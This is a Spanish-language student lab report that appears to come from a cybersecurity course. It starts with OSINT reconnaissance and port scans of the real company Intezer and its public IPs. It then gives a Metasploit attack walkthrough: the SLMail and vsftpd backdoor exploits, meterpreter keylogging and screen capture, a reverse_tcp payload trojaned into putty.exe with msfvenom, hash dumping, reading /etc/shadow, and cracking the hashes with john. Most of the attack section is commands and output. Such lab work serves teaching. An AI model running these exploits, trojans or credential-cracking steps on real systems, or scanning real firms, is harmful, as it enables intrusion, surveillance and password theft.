# Practica N°2, Diego Assia - Juan Carmona

## Información de la empresa
### Intezer
> Es una empresa dedicada al análisis genético de malware que revoluciona la detección y respuesta de amenazas cibernéticas, esto lo logra a través de revelar el código de software. Intezer también equipa empresas para que se protejan de ataques cibernéticos.

## Preguntas a responder 
### ¿Cuál (es) dominios tiene la empresa? 
- Intezer.com 
### ¿Se puede concluir algo acerca de la postura de seguridad de cada empresa a partir de la información encontrada?
De manera superficial la seguridad de la empresa es bastante buena y se esperaba que fuera así debido a que es una empresa de seguridad informática, es difícil conseguir información tales como los correos de los empleados con la información que tienen en internet puesto que no lo suelen exponer, por otro lado, en LinkedIn, son pocos los usuarios observables de la empresa si no estas unido a su red.
La ubicación de la empresa se encontró de manera rebuscada, a través de Bing ya que en Google maps no nos entregó ningún lugar. Sin embargo, por medio de la ejecución de ciertos comandos es posible obtener información que resulta difícil hallar a simple vista.

### Fierce 
Comando ejecutado: 
``` 
fierce -dns intezer.com -file responseFierce -threads 10
```
Respuesta comando: 
https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/responseFierce%20-%20copia.txt 

Hallazgos: 
Al ejecutar el comando anterior encontramos informacion más detallada de la empresa, tal como otros dominios, direcciones Ip y subredes asociadas al DNS. 
**Debido a la falta de direcciones arrojadas por el comando anterior se creó un ambiente virtual y se obtuvieron las siguientes direcciones:**
https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/fiercepy.txt 

### Shodan.io 
Links de las direcciones ip consultadas: 
https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/Shodan.io%2052.166.34.156.pdf 
https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/Shodan.io%2088.218.118.30.pdf 

Hallazgos: 
Al realizar la busqueda de las ip encontradas por el comando inicial de Fierce, obtenemos que sólo una de estas posee información al alcance pero es debido a que está en un servidor comercial (AWS), es decir, no se ofrece información a fondo de la empresa. 

### The harvester
```
theHarvester -d intezer.com -b baidu,bing,certspotter,crtsh,dnsdumpster,dogpile,duckduckgo,google,intelx,linkedin,linkedin_links,netcraft,otx,securityTrails,threatcrowd,trello,twitter,vhost,virustotal,yahoo -f responseHavester
```
Al ejecutar el comando anterior se presentaron un sin número de errores que nos obligaron a realizar modificaciones a este. Finalmente logramos que el comando nos trajera informacion relacionada al dominio pero fue imposible lograr que se almacenara en un archivo.
#### Imagenes de evidencia: 
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/HarvesterUsers.png)
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/HarvesterUrl.png)

![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/FailedKali.png)

# Escaneo de redes. 
## TCP: Full 
Las ip's seleccionadas fueron:

88.218.118.10
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Full_88.218.118.10.png)

88.218.118.100 
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Full_88.218.118.100.png)

88.218.118.101
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Full_88.218.118.101.png)

#### Ejecucion comandos en Kali 

![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Full.png)

## TCP: Half 
Las ip's seleccionadas fueron:

88.218.118.10
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Half_88.218.118.10.png)

88.218.118.100 
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Half_88.218.118.100.png)

88.218.118.101
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Half_88.218.118.101.png)

#### Ejecucion comandos en Kali 

![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Half.png)

## TCP:Ack prove
Las ip's seleccionadas fueron:

88.218.118.10
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Ack-prov_88.218.118.10.png)

88.218.118.100 
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Ack-prov_88.218.118.100.png)

88.218.118.101
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Ack-prov_88.218.118.101.png)

#### Ejecucion comandos en Kali 

![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Ack-prov.png)

## TCP:Inverse
Las ip's seleccionadas fueron:

88.218.118.10
![Chale, no cargó la imagen.](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.10.png)

88.218.118.100 
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.100.png)

88.218.118.101
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse_88.218.118.101.png)

#### Ejecucion comandos en Kali 

![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Inverse.png)

## Banner grabbing
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows.png)
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows1.png)
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Escaneo%20de%20redes%20-%20copia/Banner%20ip_windows2.png)

# Realizando Ataques. 
## Ataques sin involucrar al usuario. 
```
netstat -oan | find "110"
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/evidenciaSmMailPort/Anotaci%C3%B3n%202020-02-28%20072319.png)

```
msf > use exploit/windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > set rhost <IP_SW_Roja>
rhost => <IP_SW_Roja>
msf exploit(seattlelab_pass) > exploit
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/1.png) 
```
meterpreter > keyscan_start
meterpreter > keyscan_dump 
``` 
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/2%20(keyscan).png)
```
Captura de pantalla: 
meterpreter > load espia
Loading extension espia...success.
meterpreter > screengrab 
Screenshot saved to: /root/atdwEeHm.jpeg
meterpreter > Interrupt: use the 'exit' command to quit
meterpreter >
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/ataque%20sin%20involucrar%20al%20usuario/3%20(screengrab).png)
Captura tomada: 

![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/kBbabPhW.jpeg)

## Ataque involucrando al usuario.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4443 -x /home/Assiacarmona/Downloads/putty.exe  -k -e x86/shikata_ga_nai -i 15 -f exe > /home/Assiacarmona/deskpot/putty_e.exe
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/Ataque%20involucrando%20al%20usuario/1%20(putty).png)
```
#msfconsole
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp    //salida del comando anterior, no se digita
msf exploit(handler) > set LHOST <ip_kali>
LHOST => <ip_kali>
msf exploit(handler) > set LPORT 4443
LPORT => 4443
msf exploit(handler) > exploit
```
```
meterpreter > use priv
meterpreter > hasdump
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/Ataque%20involucrando%20al%20usuario/2%20(getting%20passwords'%20encripted).png)

## Linux 
```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > set RHOST 10.20.1.12
RHOST => 10.20.1.12
msf exploit(vsftpd_234_backdoor) > exploit
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/first%20part.png)

```
cat /etc/passwd
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/cat%20-etc-passwd.png)

```
cat /etc/shadow
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/cat%20-etc-shadow.png)
```
unshadow meta_passwd meta_shadow > meta_unshadow 
john -wordlist=/usr/share/john/password.lst  meta_unshadow 
john --show meta_unshadow  
```
![Error al cargar](https://raw.githubusercontent.com/DaaGeney/RepoCiber/master/Practica%202/Archivos/Ataque/desde%20linux/unshadow%20meta_passwd%20meta_shadow%20--%20meta_unshadow%20.png)
Archivos de contraseñas: 
https://github.com/DaaGeney/RepoCiber/blob/master/Practica%202/Archivos/meta_unshadow.txt 
